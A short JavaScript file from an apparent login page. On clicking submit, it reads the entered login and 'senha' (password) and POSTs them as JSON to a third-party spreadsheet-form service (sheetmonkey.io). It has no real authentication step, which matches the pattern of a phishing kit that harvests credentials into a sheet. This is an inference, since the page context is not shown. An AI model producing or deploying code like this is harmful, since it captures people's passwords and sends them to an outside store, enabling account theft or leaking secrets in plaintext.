const enviar = document.querySelector('#submit')


enviar.addEventListener('click', (evento)=>{
    evento.preventDefault()

    const login = document.querySelector('#login').value 
    const senha = document.querySelector('#senha').value 

   fetch('https://api.sheetmonkey.io/form/7qxyFNS3wEN5At3aqG7gb2', {
    method: 'POST',
    headers: {
        'Accept': 'application/json',
        'Content-type': 'application/json',
    },
    body: JSON.stringify({login, senha })
   })
 
})